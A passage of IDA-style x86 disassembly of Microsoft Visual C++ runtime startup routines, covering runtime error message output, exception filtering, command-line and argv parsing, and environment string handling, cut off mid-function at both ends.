					; _WinMainCRTStartup+E5p ...

Dest		= byte ptr -147h
NumberOfBytesWritten= dword ptr	-114h
var_110		= dword	ptr -110h
Filename	= byte ptr -10Ch
var_8		= byte ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 114h
		mov	eax, ___security_cookie
		mov	ecx, [ebp+arg_0]
		push	ebx
		push	esi
		mov	[ebp+var_4], eax
		push	edi
		xor	eax, eax

loc_10072B9:				; CODE XREF: __NMSG_WRITE+28j
		cmp	ecx, dword_100E220[eax*8]
		jz	short loc_10072C8
		inc	eax
		cmp	eax, 12h
		jb	short loc_10072B9

loc_10072C8:				; CODE XREF: __NMSG_WRITE+22j
		mov	esi, eax
		shl	esi, 3
		cmp	ecx, dword_100E220[esi]
		mov	[ebp+var_110], esi
		jnz	loc_1007473
		mov	eax, ___error_mode
		cmp	eax, 1
		jz	loc_1007441
		test	eax, eax
		jnz	short loc_10072FE
		cmp	___app_type, 1
		jz	loc_1007441

loc_10072FE:				; CODE XREF: __NMSG_WRITE+51j
		cmp	ecx, 0FCh
		jz	loc_1007473
		push	104h		; nSize
		lea	eax, [ebp+Filename]
		push	eax		; lpFilename
		push	0		; hModule
		mov	[ebp+var_8], 0
		call	ds:__imp__GetModuleFileNameA@12	; GetModuleFileNameA(x,x,x)
		test	eax, eax
		jnz	short loc_1007339
		push	5
		pop	ecx
		mov	esi, offset aProgramNameUnk ; "<program	name unknown>"
		lea	edi, [ebp+Filename]
		rep movsd
		movsw
		movsb

loc_1007339:				; CODE XREF: __NMSG_WRITE+86j
		lea	ebx, [ebp+Filename]
		mov	eax, ebx
		lea	edx, [eax+1]

loc_1007344:				; CODE XREF: __NMSG_WRITE+ABj
		mov	cl, [eax]
		inc	eax
		test	cl, cl
		jnz	short loc_1007344
		sub	eax, edx
		inc	eax
		cmp	eax, 3Ch
		jbe	short loc_100737C
		lea	eax, [ebp+Filename]
		lea	edx, [eax+1]

loc_100735C:				; CODE XREF: __NMSG_WRITE+C3j
		mov	cl, [eax]
		inc	eax
		test	cl, cl
		jnz	short loc_100735C
		sub	eax, edx
		push	3		; Count
		lea	ebx, [ebp+eax+Dest]
		push	offset Source	; "..."
		push	ebx		; Dest
		call	_strncpy
		add	esp, 0Ch

loc_100737C:				; CODE XREF: __NMSG_WRITE+B3j
		mov	eax, ebx
		lea	edx, [eax+1]

loc_1007381:				; CODE XREF: __NMSG_WRITE+E8j
		mov	cl, [eax]
		inc	eax
		test	cl, cl
		jnz	short loc_1007381
		sub	eax, edx
		mov	ecx, eax
		mov	eax, [ebp+var_110]
		mov	eax, off_100E224[eax]
		lea	esi, [eax+1]

loc_100739B:				; CODE XREF: __NMSG_WRITE+102j
		mov	dl, [eax]
		inc	eax
		test	dl, dl
		jnz	short loc_100739B
		sub	eax, esi
		lea	eax, [eax+ecx+1Ch]
		add	eax, 3
		and	eax, 0FFFFFFFCh
		call	__chkstk
		mov	edx, esp
		push	6
		pop	ecx
		mov	esi, offset aRuntimeErrorPr ; "Runtime Error!\n\nProgram: "
		mov	edi, edx
		rep movsd
		mov	eax, ebx
		movsw
		mov	esi, eax

loc_10073C7:				; CODE XREF: __NMSG_WRITE+12Ej
		mov	cl, [eax]
		inc	eax
		test	cl, cl
		jnz	short loc_10073C7
		mov	edi, edx
		sub	eax, esi
		dec	edi

loc_10073D3:				; CODE XREF: __NMSG_WRITE+13Bj
		mov	cl, [edi+1]
		inc	edi
		test	cl, cl
		jnz	short loc_10073D3
		mov	ecx, eax
		shr	ecx, 2
		rep movsd
		mov	ecx, eax
		and	ecx, 3
		rep movsb
		mov	edi, edx
		dec	edi

loc_10073EC:				; CODE XREF: __NMSG_WRITE+154j
		mov	al, [edi+1]
		inc	edi
		test	al, al
		jnz	short loc_10073EC
		mov	eax, [ebp+var_110]
		mov	esi, offset asc_1002330	; "\n\n"
		movsw
		movsb
		mov	eax, off_100E224[eax]
		mov	esi, eax

loc_100740A:				; CODE XREF: __NMSG_WRITE+171j
		mov	cl, [eax]
		inc	eax
		test	cl, cl
		jnz	short loc_100740A
		mov	edi, edx
		sub	eax, esi
		dec	edi

loc_1007416:				; CODE XREF: __NMSG_WRITE+17Ej
		mov	cl, [edi+1]
		inc	edi
		test	cl, cl
		jnz	short loc_1007416
		mov	ecx, eax
		shr	ecx, 2
		rep movsd
		push	12010h
		mov	ecx, eax
		and	ecx, 3
		push	offset aMicrosoftVisua ; "Microsoft Visual C++ Runtime Library"
		push	edx
		rep movsb
		call	___crtMessageBoxA
		add	esp, 0Ch
		jmp	short loc_1007473
; ---------------------------------------------------------------------------

loc_1007441:				; CODE XREF: __NMSG_WRITE+49j
					; __NMSG_WRITE+5Aj
		push	0FFFFFFF4h	; nStdHandle
		call	ds:__imp__GetStdHandle@4 ; GetStdHandle(x)
		test	eax, eax
		jz	short loc_1007473
		mov	esi, off_100E224[esi]
		mov	ecx, esi
		lea	edx, [ecx+1]

loc_1007458:				; CODE XREF: __NMSG_WRITE+1BFj
		mov	bl, [ecx]
		inc	ecx
		test	bl, bl
		jnz	short loc_1007458
		push	0		; lpOverlapped
		sub	ecx, edx
		lea	edx, [ebp+NumberOfBytesWritten]
		push	edx		; lpNumberOfBytesWritten
		push	ecx		; nNumberOfBytesToWrite
		push	esi		; lpBuffer
		push	eax		; hFile
		call	ds:__imp__WriteFile@20 ; WriteFile(x,x,x,x,x)

loc_1007473:				; CODE XREF: __NMSG_WRITE+3Bj
					; __NMSG_WRITE+66j ...
		lea	esp, [ebp-120h]
		mov	ecx, [ebp+var_4]
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
__NMSG_WRITE	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


__FF_MSGBANNER	proc near		; CODE XREF: __amsg_exit+Ep
					; _WinMainCRTStartup+DEp
		mov	eax, ___error_mode
		cmp	eax, 1
		jz	short loc_10074A2
		test	eax, eax
		jnz	short locret_10074C3
		cmp	___app_type, 1
		jnz	short locret_10074C3

loc_10074A2:				; CODE XREF: __FF_MSGBANNER+8j
		push	0FCh
		call	__NMSG_WRITE
		mov	eax, __adbgmsg
		test	eax, eax
		pop	ecx
		jz	short loc_10074B8
		call	eax ; __adbgmsg

loc_10074B8:				; CODE XREF: __FF_MSGBANNER+29j
		push	0FFh
		call	__NMSG_WRITE
		pop	ecx

locret_10074C3:				; CODE XREF: __FF_MSGBANNER+Cj
					; __FF_MSGBANNER+15j
		retn
__FF_MSGBANNER	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl _XcptFilter(int, struct _EXCEPTION_POINTERS *ExceptionInfo)
__XcptFilter	proc near		; CODE XREF: _WinMainCRTStartup+1AEp

arg_0		= dword	ptr  8
ExceptionInfo	= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	edx, [ebp+arg_0]
		mov	eax, __XcptActTabCount
		push	ebx
		mov	ecx, offset __XcptActTab
		push	esi

loc_10074DD:				; CODE XREF: __XcptFilter+27j
		cmp	[ecx], edx
		jz	short loc_10074F2
		lea	esi, [eax+eax*2]
		add	ecx, 0Ch
		lea	esi, ds:100E2B0h[esi*4]
		cmp	ecx, esi
		jb	short loc_10074DD

loc_10074F2:				; CODE XREF: __XcptFilter+16j
		lea	eax, [eax+eax*2]
		lea	eax, ds:100E2B0h[eax*4]
		cmp	ecx, eax
		jnb	short loc_1007504
		cmp	[ecx], edx
		jz	short loc_1007506

loc_1007504:				; CODE XREF: __XcptFilter+35j
		xor	ecx, ecx

loc_1007506:				; CODE XREF: __XcptFilter+39j
		test	ecx, ecx
		jz	loc_100762F
		mov	ebx, [ecx+8]
		test	ebx, ebx
		jz	loc_100762F
		cmp	ebx, 5
		jnz	short loc_100752A
		and	dword ptr [ecx+8], 0
		xor	eax, eax
		inc	eax
		jmp	loc_1007638
; ---------------------------------------------------------------------------

loc_100752A:				; CODE XREF: __XcptFilter+53j
		cmp	ebx, 1
		jz	loc_100762A
		mov	eax, __pxcptinfoptrs
		mov	[ebp+arg_0], eax
		mov	eax, [ebp+ExceptionInfo]
		mov	__pxcptinfoptrs, eax
		mov	eax, [ecx+4]
		cmp	eax, 8
		jnz	loc_100761A
		mov	eax, __First_FPE_Indx
		mov	edx, __Num_FPE
		add	edx, eax
		cmp	eax, edx
		jge	short loc_1007575
		lea	esi, [eax+eax*2]
		lea	esi, ds:100E2B8h[esi*4]
		sub	edx, eax

loc_100756C:				; CODE XREF: __XcptFilter+AAj
		and	dword ptr [esi], 0
		add	esi, 0Ch
		dec	edx
		jnz	short loc_100756C

loc_1007575:				; CODE XREF: __XcptFilter+95j
		mov	ecx, [ecx]
		cmp	ecx, 0C000008Eh
		mov	esi, __fpecode
		jnz	short loc_1007591
		mov	__fpecode, 83h
		jmp	short loc_1007607
; ---------------------------------------------------------------------------

loc_1007591:				; CODE XREF: __XcptFilter+BAj
		cmp	ecx, 0C0000090h
		jnz	short loc_10075A5
		mov	__fpecode, 81h
		jmp	short loc_1007607
; ---------------------------------------------------------------------------

loc_10075A5:				; CODE XREF: __XcptFilter+CEj
		cmp	ecx, 0C0000091h
		jnz	short loc_10075B9
		mov	__fpecode, 84h
		jmp	short loc_1007607
; ---------------------------------------------------------------------------

loc_10075B9:				; CODE XREF: __XcptFilter+E2j
		cmp	ecx, 0C0000093h
		jnz	short loc_10075CD
		mov	__fpecode, 85h
		jmp	short loc_1007607
; ---------------------------------------------------------------------------

loc_10075CD:				; CODE XREF: __XcptFilter+F6j
		cmp	ecx, 0C000008Dh
		jnz	short loc_10075E1
		mov	__fpecode, 82h
		jmp	short loc_1007607
; ---------------------------------------------------------------------------

loc_10075E1:				; CODE XREF: __XcptFilter+10Aj
		cmp	ecx, 0C000008Fh
		jnz	short loc_10075F5
		mov	__fpecode, 86h
		jmp	short loc_1007607
; ---------------------------------------------------------------------------

loc_10075F5:				; CODE XREF: __XcptFilter+11Ej
		cmp	ecx, 0C0000092h
		jnz	short loc_1007607
		mov	__fpecode, 8Ah

loc_1007607:				; CODE XREF: __XcptFilter+C6j
					; __XcptFilter+DAj ...
		push	__fpecode
		push	8
		call	ebx
		pop	ecx
		mov	__fpecode, esi
		jmp	short loc_1007621
; ---------------------------------------------------------------------------

loc_100761A:				; CODE XREF: __XcptFilter+80j
		and	dword ptr [ecx+8], 0
		push	eax
		call	ebx

loc_1007621:				; CODE XREF: __XcptFilter+14Fj
		mov	eax, [ebp+arg_0]
		pop	ecx
		mov	__pxcptinfoptrs, eax

loc_100762A:				; CODE XREF: __XcptFilter+64j
		or	eax, 0FFFFFFFFh
		jmp	short loc_1007638
; ---------------------------------------------------------------------------

loc_100762F:				; CODE XREF: __XcptFilter+3Fj
					; __XcptFilter+4Aj
		push	[ebp+ExceptionInfo] ; ExceptionInfo
		call	ds:__imp__UnhandledExceptionFilter@4 ; UnhandledExceptionFilter(x)

loc_1007638:				; CODE XREF: __XcptFilter+5Cj
					; __XcptFilter+164j
		pop	esi
		pop	ebx
		pop	ebp
		retn
__XcptFilter	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


__wincmdln	proc near		; CODE XREF: _WinMainCRTStartup+163p
		cmp	___mbctype_initialized,	0
		jnz	short loc_100764F
		call	___initmbctable

loc_100764F:				; CODE XREF: __wincmdln+7j
		push	esi
		mov	esi, __acmdln
		test	esi, esi
		jnz	short loc_1007661
		mov	esi, offset byte_1001DFC
		jmp	short loc_10076A6
; ---------------------------------------------------------------------------

loc_1007661:				; CODE XREF: __wincmdln+17j
		mov	al, [esi]
		cmp	al, 22h
		jnz	short loc_100768F
		inc	esi
		mov	al, [esi]
		cmp	al, 22h
		jz	short loc_100769F

loc_100766E:				; CODE XREF: __wincmdln+45j
		test	al, al
		jz	short loc_1007688
		movzx	eax, al
		push	eax		; unsigned int
		call	__ismbblead
		test	eax, eax
		pop	ecx
		jz	short loc_1007681
		inc	esi

loc_1007681:				; CODE XREF: __wincmdln+3Dj
		inc	esi
		mov	al, [esi]
		cmp	al, 22h
		jnz	short loc_100766E

loc_1007688:				; CODE XREF: __wincmdln+2Fj
		cmp	byte ptr [esi],	22h
		jnz	short loc_10076A0
		jmp	short loc_100769F
; ---------------------------------------------------------------------------

loc_100768F:				; CODE XREF: __wincmdln+24j
		cmp	al, 20h
		jbe	short loc_10076A0

loc_1007693:				; CODE XREF: __wincmdln+56j
		inc	esi
		cmp	byte ptr [esi],	20h
		ja	short loc_1007693
		jmp	short loc_10076A0
; ---------------------------------------------------------------------------

loc_100769B:				; CODE XREF: __wincmdln+63j
		cmp	al, 20h
		ja	short loc_10076A6

loc_100769F:				; CODE XREF: __wincmdln+2Bj
					; __wincmdln+4Cj
		inc	esi

loc_10076A0:				; CODE XREF: __wincmdln+4Aj
					; __wincmdln+50j ...
		mov	al, [esi]
		test	al, al
		jnz	short loc_100769B

loc_10076A6:				; CODE XREF: __wincmdln+1Ej
					; __wincmdln+5Cj
		mov	eax, esi
		pop	esi
		retn
__wincmdln	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


__setenvp	proc near		; CODE XREF: _WinMainCRTStartup:loc_10065BDp
		mov	edi, edi
		push	edi
		xor	edi, edi
		cmp	___mbctype_initialized,	edi
		jnz	short loc_10076C1
		call	___initmbctable

loc_10076C1:				; CODE XREF: __setenvp+Bj
		mov	eax, __aenvptr
		cmp	eax, edi
		jnz	short loc_10076CF
		or	eax, 0FFFFFFFFh
		pop	edi
		retn
; ---------------------------------------------------------------------------

loc_10076CF:				; CODE XREF: __setenvp+19j
		push	esi
		jmp	short loc_10076EA
; ---------------------------------------------------------------------------

loc_10076D2:				; CODE XREF: __setenvp+3Fj
		cmp	cl, 3Dh
		jz	short loc_10076D8
		inc	edi

loc_10076D8:				; CODE XREF: __setenvp+26j
		mov	ecx, eax
		lea	esi, [ecx+1]

loc_10076DD:				; CODE XREF: __setenvp+33j
		mov	dl, [ecx]
		inc	ecx
		test	dl, dl
		jnz	short loc_10076DD
		sub	ecx, esi
		lea	eax, [eax+ecx+1]

loc_10076EA:				; CODE XREF: __setenvp+21j
		mov	cl, [eax]
		test	cl, cl
		jnz	short loc_10076D2
		lea	eax, ds:4[edi*4]
		push	ebx
		push	eax		; Size
		call	_malloc
		mov	ebx, eax
		test	ebx, ebx
		pop	ecx
		mov	__environ, ebx
		jnz	short loc_1007710
		or	eax, 0FFFFFFFFh
		jmp	short loc_1007776
; ---------------------------------------------------------------------------

loc_1007710:				; CODE XREF: __setenvp+5Aj
		mov	esi, __aenvptr
		jmp	short loc_100774E
; ---------------------------------------------------------------------------

loc_1007718:				; CODE XREF: __setenvp+A3j
		mov	eax, esi
		lea	edi, [eax+1]

loc_100771D:				; CODE XREF: __setenvp+73j
		mov	dl, [eax]
		inc	eax
		test	dl, dl
		jnz	short loc_100771D
		sub	eax, edi
		cmp	cl, 3Dh
		lea	edi, [eax+1]
		jz	short loc_100774C
		push	edi		; Size
		call	_malloc
		test	eax, eax
		pop	ecx
		mov	[ebx], eax
		jz	short loc_100777A
		mov	ecx, esi
		mov	edx, eax

loc_100773F:				; CODE XREF: __setenvp+98j
		mov	al, [ecx]
		inc	ecx
		mov	[edx], al
		inc	edx
		test	al, al
		jnz	short loc_100773F
		add	ebx, 4

loc_100774C:				; CODE XREF: __setenvp+7Dj
		add	esi, edi

loc_100774E:				; CODE XREF: __setenvp+67j
		mov	cl, [esi]
		test	cl, cl
		jnz	short loc_1007718
		push	__aenvptr	; Memory
		call	_free
		and	__aenvptr, 0
		and	dword ptr [ebx], 0
		mov	___env_initialized, 1
		xor	eax, eax

loc_1007775:				; CODE XREF: __setenvp+E0j
		pop	ecx

loc_1007776:				; CODE XREF: __setenvp+5Fj
		pop	ebx
		pop	esi
		pop	edi
		retn
; ---------------------------------------------------------------------------

loc_100777A:				; CODE XREF: __setenvp+8Aj
		push	__environ	; Memory
		call	_free
		and	__environ, 0
		or	eax, 0FFFFFFFFh
		jmp	short loc_1007775
__setenvp	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1007796	proc near		; CODE XREF: __setargv+56p
					; __setargv+87p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		mov	ebx, [ebp+arg_4]
		xor	edx, edx
		cmp	[ebp+arg_0], edx
		push	edi
		mov	[esi], edx
		mov	edi, ecx
		mov	dword ptr [ebx], 1
		jz	short loc_10077BB
		mov	ecx, [ebp+arg_0]
		add	[ebp+arg_0], 4
		mov	[ecx], edi

loc_10077BB:				; CODE XREF: sub_1007796+1Aj
					; sub_1007796+67j ...
		cmp	byte ptr [eax],	22h
		jnz	short loc_10077CE
		xor	ecx, ecx
		test	edx, edx
		setz	cl
		inc	eax
		mov	edx, ecx
		mov	cl, 22h
		jmp	short loc_10077FB
; ---------------------------------------------------------------------------

loc_10077CE:				; CODE XREF: sub_1007796+28j
		inc	dword ptr [esi]
		test	edi, edi
		jz	short loc_10077D9
		mov	cl, [eax]
		mov	[edi], cl
		inc	edi

loc_10077D9:				; CODE XREF: sub_1007796+3Cj
		mov	cl, [eax]
		movzx	ebx, cl
		inc	eax
		test	byte_1011901[ebx], 4
		jz	short loc_10077F4
		inc	dword ptr [esi]
		test	edi, edi
		jz	short loc_10077F3
		mov	bl, [eax]
		mov	[edi], bl
		inc	edi

loc_10077F3:				; CODE XREF: sub_1007796+56j
		inc	eax

loc_10077F4:				; CODE XREF: sub_1007796+50j
		test	cl, cl
		mov	ebx, [ebp+arg_4]
		jz	short loc_100782D

loc_10077FB:				; CODE XREF: sub_1007796+36j
		test	edx, edx
		jnz	short loc_10077BB
		cmp	cl, 20h
		jz	short loc_1007809
		cmp	cl, 9
		jnz	short loc_10077BB

loc_1007809:				; CODE XREF: sub_1007796+6Cj
		test	edi, edi
		jz	short loc_1007811
		mov	byte ptr [edi-1], 0

loc_1007811:				; CODE XREF: sub_1007796+75j
					; sub_1007796+98j
		and	[ebp+var_4], 0

loc_1007815:				; CODE XREF: sub_1007796+159j
		cmp	byte ptr [eax],	0
		jz	loc_10078F4

loc_100781E:				; CODE XREF: sub_1007796+95j
		mov	cl, [eax]
		cmp	cl, 20h
		jz	short loc_100782A
		cmp	cl, 9
		jnz	short loc_1007830

loc_100782A:				; CODE XREF: sub_1007796+8Dj
		inc	eax
		jmp	short loc_100781E
; ---------------------------------------------------------------------------

loc_100782D:				; CODE XREF: sub_1007796+63j
		dec	eax
		jmp	short loc_1007811
; ---------------------------------------------------------------------------

loc_1007830:				; CODE XREF: sub_1007796+92j
		cmp	byte ptr [eax],	0
		jz	loc_10078F4
		cmp	[ebp+arg_0], 0
		jz	short loc_1007848
		mov	ecx, [ebp+arg_0]
		add	[ebp+arg_0], 4
		mov	[ecx], edi

loc_1007848:				; CODE XREF: sub_1007796+A7j
		inc	dword ptr [ebx]

loc_100784A:				; CODE XREF: sub_1007796+147j
		xor	ebx, ebx
		inc	ebx
		xor	edx, edx
		jmp	short loc_1007853
; ---------------------------------------------------------------------------

loc_1007851:				; CODE XREF: sub_1007796+C0j
		inc	eax
		inc	edx

loc_1007853:				; CODE XREF: sub_1007796+B9j
		cmp	byte ptr [eax],	5Ch
		jz	short loc_1007851
		cmp	byte ptr [eax],	22h
		jnz	short loc_1007883
		test	dl, 1
		jnz	short loc_1007881
		cmp	[ebp+var_4], 0
		jz	short loc_1007874
		lea	ecx, [eax+1]
		cmp	byte ptr [ecx],	22h
		jnz	short loc_1007874
		mov	eax, ecx
		jmp	short loc_1007876
; ---------------------------------------------------------------------------

loc_1007874:				; CODE XREF: sub_1007796+D0j
					; sub_1007796+D8j
		xor	ebx, ebx

loc_1007876:				; CODE XREF: sub_1007796+DCj
		xor	ecx, ecx
		cmp	[ebp+var_4], ecx
		setz	cl
		mov	[ebp+var_4], ecx

loc_1007881:				; CODE XREF: sub_1007796+CAj
		shr	edx, 1

loc_1007883:				; CODE XREF: sub_1007796+C5j
		test	edx, edx
		jz	short loc_1007894

loc_1007887:				; CODE XREF: sub_1007796+FCj
		test	edi, edi
		jz	short loc_100788F
		mov	byte ptr [edi],	5Ch
		inc	edi

loc_100788F:				; CODE XREF: sub_1007796+F3j
		inc	dword ptr [esi]
		dec	edx
		jnz	short loc_1007887

loc_1007894:				; CODE XREF: sub_1007796+EFj
		mov	cl, [eax]
		test	cl, cl
		jz	short loc_10078E2
		cmp	[ebp+var_4], 0
		jnz	short loc_10078AA
		cmp	cl, 20h
		jz	short loc_10078E2
		cmp	cl, 9
		jz	short loc_10078E2

loc_10078AA:				; CODE XREF: sub_1007796+108j
		test	ebx, ebx
		jz	short loc_10078DC
		test	edi, edi
		jz	short loc_10078CB
		movzx	edx, cl
		test	byte_1011901[edx], 4
		jz	short loc_10078C4
		mov	[edi], cl
		inc	edi
		inc	eax
		inc	dword ptr [esi]

loc_10078C4:				; CODE XREF: sub_1007796+126j
		mov	cl, [eax]
		mov	[edi], cl
		inc	edi
		jmp	short loc_10078DA
; ---------------------------------------------------------------------------

loc_10078CB:				; CODE XREF: sub_1007796+11Aj
		movzx	ecx, cl
		test	byte_1011901[ecx], 4
		jz	short loc_10078DA
		inc	eax
		inc	dword ptr [esi]

loc_10078DA:				; CODE XREF: sub_1007796+133j
					; sub_1007796+13Fj
		inc	dword ptr [esi]

loc_10078DC:				; CODE XREF: sub_1007796+116j
		inc	eax
		jmp	loc_100784A
; ---------------------------------------------------------------------------

loc_10078E2:				; CODE XREF: sub_1007796+102j
					; sub_1007796+10Dj ...
		test	edi, edi
		jz	short loc_10078EA
		mov	byte ptr [edi],	0
		inc	edi

loc_10078EA:				; CODE XREF: sub_1007796+14Ej
		inc	dword ptr [esi]
		mov	ebx, [ebp+arg_4]
		jmp	loc_1007815
; ---------------------------------------------------------------------------

loc_10078F4:				; CODE XREF: sub_1007796+82j
					; sub_1007796+9Dj
		mov	eax, [ebp+arg_0]
		test	eax, eax
		jz	short loc_10078FE
		and	dword ptr [eax], 0

loc_10078FE:				; CODE XREF: sub_1007796+163j
		inc	dword ptr [ebx]
		pop	edi
		pop	ebx
		leave
		retn
sub_1007796	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

__setargv	proc near		; CODE XREF: _WinMainCRTStartup+120p

var_8		= dword	ptr -8
var_4		= dword	ptr -4

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	ebx
		push	esi
		push	edi
		xor	edi, edi
		cmp	___mbctype_initialized,	edi
		jnz	short loc_1007922
		call	___initmbctable

loc_1007922:				; CODE XREF: __setargv+12j
		push	104h		; nSize
		mov	esi, offset Filename
		push	esi		; lpFilename
		push	edi		; hModule
		mov	byte_10106EC, 0
		call	ds:__imp__GetModuleFileNameA@12	; GetModuleFileNameA(x,x,x)
		mov	eax, __acmdln
		cmp	eax, edi
		mov	__pgmptr, esi
		jz	short loc_1007951
		cmp	byte ptr [eax],	0
		mov	ebx, eax
		jnz	short loc_1007953

loc_1007951:				; CODE XREF: __setargv+3Fj
		mov	ebx, esi

loc_1007953:				; CODE XREF: __setargv+46j
		lea	eax, [ebp+var_4]
		push	eax
		push	edi
		lea	esi, [ebp+var_8]
		xor	ecx, ecx
		mov	eax, ebx
		call	sub_1007796
		mov	esi, [ebp+var_4]
		mov	eax, [ebp+var_8]
		shl	esi, 2
		add	eax, esi
		push	eax		; Size
		call	_malloc
		mov	edi, eax
		add	esp, 0Ch
		test	edi, edi
		jnz	short loc_1007983
		or	eax, 0FFFFFFFFh
		jmp	short loc_10079A8
; ---------------------------------------------------------------------------

loc_1007983:				; CODE XREF: __setargv+73j
		lea	eax, [ebp+var_4]
		push	eax
		lea	ecx, [esi+edi]
		push	edi
		lea	esi, [ebp+var_8]
		mov	eax, ebx
		call	sub_1007796
		mov	eax, [ebp+var_4]
		dec	eax
		pop	ecx
		mov	___argc, eax
		pop	ecx
		mov	___argv, edi
		xor	eax, eax

loc_10079A8:				; CODE XREF: __setargv+78j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
__setargv	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

___crtGetEnvironmentStringsA proc near	; CODE XREF: _WinMainCRTStartup+116p

cchWideChar	= dword	ptr -0Ch
cbMultiByte	= dword	ptr -8
Memory		= dword	ptr -4

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		mov	eax, dword_10106F0
		push	ebx
		push	esi
		mov	esi, ds:__imp__GetEnvironmentStringsW@0	; GetEnvironmentStringsW()
		push	edi
		xor	ebx, ebx
		xor	edi, edi
		cmp	eax, ebx
		jnz	short loc_10079FE
		call	esi ; GetEnvironmentStringsW() ; GetEnvironmentStringsW()
		mov	edi, eax
		cmp	edi, ebx
		jz	short loc_10079E4
		mov	dword_10106F0, 1
		jmp	short loc_1007A03
; ---------------------------------------------------------------------------

loc_10079E4:				; CODE XREF: ___crtGetEnvironmentStringsA+24j
		call	ds:__imp__GetLastError@0 ; GetLastError()
		cmp	eax, 78h
		jnz	short loc_10079F9
		push	2
		pop	eax
		mov	dword_10106F0, eax
		jmp	short loc_10079FE
; ---------------------------------------------------------------------------

loc_10079F9:				; CODE XREF: ___crtGetEnvironmentStringsA+3Bj
		mov	eax, dword_10106F0

loc_10079FE:				; CODE XREF: ___crtGetEnvironmentStringsA+1Cj
					; ___crtGetEnvironmentStringsA+45j
		cmp	eax, 1
		jnz	short loc_1007A7B

loc_1007A03:				; CODE XREF: ___crtGetEnvironmentStringsA+30j
		cmp	edi, ebx
		jnz	short loc_1007A0F
		call	esi ; GetEnvironmentStringsW() ; GetEnvironmentStringsW()
		mov	edi, eax
		cmp	edi, ebx
		jz	short loc_1007A84

loc_1007A0F:				; CODE XREF: ___crtGetEnvironmentStringsA+53j
		cmp	[edi], bx
		mov	eax, edi
		jz	short loc_1007A24

loc_1007A16:				; CODE XREF: ___crtGetEnvironmentStringsA+69j
					; ___crtGetEnvironmentStringsA+70j
		inc	eax
		inc	eax
		cmp	[eax], bx
		jnz	short loc_1007A16
		inc	eax
		inc	eax
		cmp	[eax], bx
		jnz	short loc_1007A16

loc_1007A24:				; CODE XREF: ___crtGetEnvironmentStringsA+62j
		mov	esi, ds:__imp__WideCharToMultiByte@32 ;	WideCharToMultiByte(x,x,x,x,x,x,x,x)
		push	ebx		; lpUsedDefaultChar
		push	ebx		; lpDefaultChar
		push	ebx		; cbMultiByte
		sub	eax, edi
		push	ebx		; lpMultiByteStr
		sar	eax, 1
		inc	eax
		push	eax		; cchWideChar
		push	edi		; lpWideCharStr
		push	ebx		; dwFlags
		push	ebx		; CodePage
		mov	[ebp+cchWideChar], eax
		call	esi ; WideCharToMultiByte(x,x,x,x,x,x,x,x) ; WideCharToMultiByte(x,x,x,x,x,x,x,x)
		cmp	eax, ebx
		mov	[ebp+cbMultiByte], eax
		jz	short loc_1007A72
		push	eax		; Size
		call	_malloc
		cmp	eax, ebx
		pop	ecx
		mov	[ebp+Memory], eax
		jz	short loc_1007A72
		push	ebx		; lpUsedDefaultChar
		push	ebx		; lpDefaultChar
		push	[ebp+cbMultiByte] ; cbMultiByte
		push	eax		; lpMultiByteStr
		push	[ebp+cchWideChar] ; cchWideChar
		push	edi		; lpWideCharStr
		push	ebx		; dwFlags
		push	ebx		; CodePage
		call	esi ; WideCharToMultiByte(x,x,x,x,x,x,x,x) ; WideCharToMultiByte(x,x,x,x,x,x,x,x)
		test	eax, eax
		jnz	short loc_1007A6F
		push	[ebp+Memory]	; Memory
		call	_free
		pop	ecx
		mov	[ebp+Memory], ebx

loc_1007A6F:				; CODE XREF: ___crtGetEnvironmentStringsA+AFj
		mov	ebx, [ebp+Memory]

loc_1007A72:				; CODE XREF: ___crtGetEnvironmentStringsA+8Fj
					; ___crtGetEnvironmentStringsA+9Dj
		push	edi		; LPWCH
		call	ds:__imp__FreeEnvironmentStringsW@4 ; FreeEnvironmentStringsW(x)
		jmp	short loc_1007AD3
; ---------------------------------------------------------------------------

loc_1007A7B:				; CODE XREF: ___crtGetEnvironmentStringsA+4Fj
		cmp	eax, 2
		jz	short loc_1007A88
		cmp	eax, ebx
		jz	short loc_1007A88

loc_1007A84:				; CODE XREF: ___crtGetEnvironmentStringsA+5Bj
					; ___crtGetEnvironmentStringsA+E3j
		xor	eax, eax
		jmp	short loc_1007AD5
; ---------------------------------------------------------------------------

loc_1007A88:				; CODE XREF: ___crtGetEnvironmentStringsA+CCj
					; ___crtGetEnvironmentStringsA+D0j
		call	ds:__imp__GetEnvironmentStrings@0 ; GetEnvironmentStrings()
		mov	esi, eax
		cmp	esi, ebx
		mov	[ebp+Memory], esi
		jz	short loc_1007A84
		cmp	[esi], bl
		jz	short loc_1007AA5

loc_1007A9B:				; CODE XREF: ___crtGetEnvironmentStringsA+ECj
					; ___crtGetEnvironmentStringsA+F1j
		inc	eax
		cmp	[eax], bl
		jnz	short loc_1007A9B
		inc	eax
		cmp	[eax], bl
		jnz	short loc_1007A9B

loc_1007AA5:				; CODE XREF: ___crtGetEnvironmentStringsA+E7j
		sub	eax, esi
		inc	eax
		mov	edi, eax
		push	edi		; Size
		call	_malloc
		cmp	eax, ebx
		pop	ecx
		jz	short loc_1007ACC
